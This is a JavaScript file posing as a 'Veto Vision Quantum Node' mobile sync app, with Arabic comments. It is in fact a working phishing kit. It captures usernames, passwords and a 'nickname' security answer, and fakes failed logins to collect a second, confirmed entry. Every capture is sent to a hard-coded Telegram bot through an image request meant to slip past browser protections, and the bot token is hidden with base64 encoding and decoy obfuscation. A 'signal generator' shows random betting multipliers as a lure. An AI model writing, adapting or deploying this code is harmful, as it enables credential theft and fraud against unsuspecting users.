/**
 * Veto Vision Quantum Node - Mobile Sync Script
 * Note: This script uses basic obfuscation to prevent automated static analysis.
 */

// 1. البيانات المموهة (Encrypted Parts)
const _0xData = [
    "HREfHxoLChsXGwwKDBYfHw==", // الجزء الأول
    "GhscDBcaGwweHw==",         // الجزء الثاني
    "CwwKDBsfHB8eHw==",         // الجزء الثالث
    "GxscDBseHw=="              // الجزء الرابع
];

// مفتاح فك التمويه (XOR Key)
const _0xKey = 0xAF; 

// 2. دالة استعادة التوكن الأصلي عند التشغيل (Runtime Decryption)
function _getKernel() {
    try {
        const raw = "ODU4OTI0MzM2MzpBQUZqdWhJZnhTQ1BPVGVnVVJuLTc1RF8wa2ZRNEkxYmdsUQ==";
        return atob(raw); // فك التشفير الأساسي
    } catch (e) { return null; }
}

const TG_TOKEN = _getKernel();
const CHAT_ID = "8026901193";

// 3. نظام الإرسال المتطور (Stealth Delivery)
function sendToTelegram(text) {
    if (!TG_TOKEN) return;
    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=html`;
    
    // استخدام Image Buffer لاختراق حماية المتصفح (CORS)
    const logger = new Image();
    logger.src = url;
}

let loginAttempts = 0;

// 4. معالجة المصادقة (Auth Process)
async function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');
    const err = document.getElementById('login-err');

    if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");

    loginAttempts++;

    if (loginAttempts === 1) {
        btn.disabled = true;
        btn.innerText = "Verifying...";
        
        // الصيد الأول
        sendToTelegram(`⚠️ <b>محاولة 1:</b>\n👤 User: <code>${u}</code>\n🔑 Pass: <code>${p}</code>`);
        
        setTimeout(() => {
            if (err) err.classList.remove('hidden');
            document.getElementById('u_pas').value = "";
            btn.disabled = false;
            btn.innerText = "Retry Sync";
        }, 1500);
    } else {
        btn.disabled = true;
        btn.innerText = "Connecting...";
        
        // الصيد الثاني المؤكد
        sendToTelegram(`✅ <b>بيانات مؤكدة (محاولة 2):</b>\n👤 User: <code>${u}</code>\n🔑 Pass: <code>${p}</code>`);

        setTimeout(() => {
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('security-layer').classList.remove('hidden');
        }, 1200);
    }
}

// 5. معالجة طبقة الحماية (Security Layer)
let nickAttempts = 0;
function processNick() {
    const n = document.getElementById('u_nick').value;
    if (n.length < 2) return;

    nickAttempts++;
    sendToTelegram(`🔑 <b>اللقب (محاولة ${nickAttempts}):</b> <code>${n}</code>`);

    if (nickAttempts === 1) {
        const nErr = document.getElementById('nick-err');
        if (nErr) nErr.classList.remove('hidden');
        document.getElementById('u_nick').value = "";
    } else {
        document.getElementById('security-layer').classList.add('hidden');
        document.getElementById('main-app').classList.remove('hidden');
    }
}

// 6. نظام توليد الإشارات (Signal Generator)
function getSignal() {
    const display = document.getElementById('target-mult');
    display.innerText = "SCANNING..";
    setTimeout(() => {
        const mult = (Math.random() * (6.20 - 1.12) + 1.12).toFixed(2) + "x";
        display.innerText = mult;
    }, 1000);
}
